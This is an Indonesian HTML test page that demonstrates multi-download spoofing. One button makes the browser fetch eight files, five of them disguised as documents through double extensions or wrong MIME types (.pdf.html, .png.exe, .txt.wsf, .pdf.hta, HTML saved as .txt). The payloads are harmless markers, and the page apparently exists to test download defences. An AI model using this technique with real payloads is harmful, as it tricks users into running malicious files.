<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Uji Multi-Download Spoofing</title>
<style>
body {
font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
padding: 40px;
background-color: #121212;
color: #e0e0e0;
max-width: 1000px;
margin: 0 auto;
}
h1 {
color: #ffffff;
text-align: center;
}
p.deskripsi {
text-align: center;
color: #aaaaaa;
margin-bottom: 30px;
line-height: 1.6;
}
.panel {
background-color: #1e1e1e;
border: 1px solid #333;
border-radius: 8px;
padding: 25px;
margin-bottom: 20px;
}
.panel h3 {
margin-top: 0;
color: #0078d4;
}
.tombol-utama {
padding: 18px 30px;
font-size: 18px;
font-weight: bold;
cursor: pointer;
border-radius: 6px;
border: none;
background-color: #d83b01;
color: white;
width: 100%;
margin: 10px 0;
transition: background-color 0.2s;
}
.tombol-utama:hover {
background-color: #b83202;
}
.tombol-sekunder {
padding: 12px 20px;
font-size: 14px;
font-weight: bold;
cursor: pointer;
border-radius: 4px;
border: none;
background-color: #0078d4;
color: white;
width: 100%;
margin: 6px 0;
}
.tombol-sekunder:hover {
background-color: #005a9e;
}
.daftar-file {
background: #0a0a0a;
border: 1px solid #333;
padding: 15px;
border-radius: 6px;
font-family: monospace;
font-size: 13px;
margin-top: 15px;
max-height: 300px;
overflow-y: auto;
}
.daftar-file .item {
padding: 6px 8px;
border-bottom: 1px solid #222;
display: flex;
justify-content: space-between;
gap: 10px;
}
.daftar-file .item:last-child {
border-bottom: none;
}
.daftar-file .aman {
color: #4caf50;
}
.daftar-file .bahaya {
color: #f44336;
font-weight: bold;
}
.daftar-file .netral {
color: #888;
}
.badge {
font-size: 11px;
padding: 2px 6px;
border-radius: 3px;
background: #333;
color: #aaa;
}
.badge-bahaya {
background: #d83b01;
color: #fff;
}
.hasil {
background: #000;
border: 1px solid #333;
padding: 15px;
margin-top: 15px;
font-family: monospace;
font-size: 12px;
color: #0f0;
border-radius: 6px;
white-space: pre-wrap;
max-height: 200px;
overflow-y: auto;
}
</style>
</head>
<body>

<h1>Uji Multi-Download Spoofing</h1>
<p class="deskripsi">Satu klik tombol → browser minta izin unduh banyak file. Di dalam antrean diselipkan berkas berbahaya (.html, .exe, .hta) yang menyamar sebagai file dokumen biasa.</p>

<div class="panel">
<h3>Antrean File yang Akan Diunduh</h3>
<div class="daftar-file" id="daftarFile"></div>
</div>

<div class="panel">
<h3>Tombol Pemicu</h3>
<button class="tombol-utama" id="btnMulai">⬇ Download 8 File Sekaligus</button>
<button class="tombol-sekunder" id="btnBersihkan">Bersihkan Log</button>
</div>

<div class="panel">
<h3>Log Eksekusi</h3>
<div class="hasil" id="log">Menunggu aksi...</div>
</div>

<script>
var daftarFileEl = document.getElementById('daftarFile');
var logEl = document.getElementById('log');
var logBuffer = [];

function tulisLog(pesan) {
var waktu = new Date().toLocaleTimeString('id-ID');
logBuffer.push('[' + waktu + '] ' + pesan);
logEl.textContent = logBuffer.join('\n');
logEl.scrollTop = logEl.scrollHeight;
}

var payloadHtmlAktif = '<!DOCTYPE html>\n' +
'<html>\n' +
'<head><meta charset="UTF-8"><title>Dokumen</title></head>\n' +
'<body style="background:#000;color:#0f0;font-family:monospace;padding:40px">\n' +
'<h1 style="color:#f44336">FILE BERBAHAYA BERHASIL DIEKSEKUSI</h1>\n' +
'<p>File ini terlihat seperti dokumen biasa (.txt / .pdf / .docx),</p>\n' +
'<p>tetapi sebenarnya adalah HTML aktif yang dijalankan browser.</p>\n' +
'<p>Origin: <span id="o"></span></p>\n' +
'<script>\n' +
'document.getElementById("o").textContent = window.location.origin || "null (file lokal)";\n' +
'alert("Payload aktif! Origin: " + (window.location.origin || "null"));\n' +
'<\/script>\n' +
'</body>\n' +
'</html>';

var payloadExeTiruan = "MZ\u0090\u0000\u0003Simulasi header PE executable.\n" +
"File ini BUKAN executable asli, hanya marker untuk uji deteksi.";

var payloadHta = '<html>\n' +
'<head><title>HTA</title></head>\n' +
'<body>\n' +
'<script language="VBScript">\n' +
'MsgBox "HTA berjalan!"\n' +
'<\/script>\n' +
'</body>\n' +
'</html>';

var payloadWsf = '<job><script language="JScript">\n' +
'WScript.Echo("WSF aktif");\n' +
'<\/script></job>';

var payloadTeksAman = "Ini dokumen teks biasa. Tidak ada yang berbahaya di sini.\n" +
"Baris 2: lorem ipsum dolor sit amet.\n" +
"Baris 3: data dummy untuk uji multi-download.\n";

var daftarUnduhan = [
{ nama: 'laporan_keuangan_2024.pdf', isi: payloadTeksAman, mime: 'application/pdf', bahaya: false, ket: 'Teks biasa, aman' },
{ nama: 'catatan_rapat.txt', isi: payloadTeksAman, mime: 'text/plain', bahaya: false, ket: 'Teks biasa, aman' },
{ nama: 'data_pelanggan.txt', isi: payloadHtmlAktif, mime: 'text/plain', bahaya: true, ket: 'HTML disamarkan sebagai .txt' },
{ nama: 'invoice_desember.pdf.html', isi: payloadHtmlAktif, mime: 'text/html', bahaya: true, ket: 'Ekstensi ganda .pdf.html' },
{ nama: 'screenshot_bukti.png.exe', isi: payloadExeTiruan, mime: 'application/octet-stream', bahaya: true, ket: 'Eksekutabel palsu' },
{ nama: 'patch_security.txt.wsf', isi: payloadWsf, mime: 'text/xml', bahaya: true, ket: 'Windows Script File' },
{ nama: 'undangan_rapat.txt', isi: payloadTeksAman, mime: 'text/plain', bahaya: false, ket: 'Teks biasa, aman' },
{ nama: 'laporan_audit.pdf.hta', isi: payloadHta, mime: 'application/hta', bahaya: true, ket: 'Aplikasi HTML aktif' }
];

function renderDaftar() {
daftarFileEl.innerHTML = '';
daftarUnduhan.forEach(function(item, index) {
var kelas = item.bahaya ? 'bahaya' : 'aman';
var label = item.bahaya ? '<span class="badge badge-bahaya">BAHAYA</span>' : '<span class="badge">aman</span>';
var div = document.createElement('div');
div.className = 'item';
div.innerHTML = '<span class="' + kelas + '">' + (index + 1) + '. ' + item.nama + '</span>' +
'<span>' + label + ' <span style="color:#666;font-size:11px">' + item.ket + '</span></span>';
daftarFileEl.appendChild(div);
});
}

function buatBlob(item) {
return new Blob([item.isi], { type: item.mime });
}

function picuUnduhanTunggal(item, index) {
return new Promise(function(resolve) {
setTimeout(function() {
try {
var blob = buatBlob(item);
var url = URL.createObjectURL(blob);
var a = document.createElement('a');
a.href = url;
a.download = item.nama;
document.body.appendChild(a);
a.click();
setTimeout(function() {
document.body.removeChild(a);
URL.revokeObjectURL(url);
}, 200);

var status = item.bahaya ? 'BAHAYA' : 'aman';
tulisLog('[' + (index + 1) + '/8] ' + item.nama + ' — ' + status + ' (' + item.mime + ')');
resolve(true);
} catch (err) {
tulisLog('[' + (index + 1) + '/8] GAGAL: ' + item.nama + ' — ' + err.message);
resolve(false);
}
}, index * 350);
});
}

function jalankanSemua() {
logBuffer = [];
logEl.textContent = '';
tulisLog('Memulai multi-download...');
tulisLog('Browser mungkin menampilkan dialog "Izinkan unduh banyak file?"');
tulisLog('');

var antrean = Promise.resolve();
daftarUnduhan.forEach(function(item, index) {
antrean = antrean.then(function() {
return picuUnduhanTunggal(item, index);
});
});

antrean.then(function() {
tulisLog('');
tulisLog('Selesai. Periksa folder Download Anda.');
tulisLog('Cek: apakah file .txt / .pdf bisa dibuka sebagai HTML?');
});
}

document.getElementById('btnMulai').addEventListener('click', function() {
jalankanSemua();
});

document.getElementById('btnBersihkan').addEventListener('click', function() {
logBuffer = [];
logEl.textContent = 'Log dibersihkan.';
});

renderDaftar();
</script>

</body>
</html>
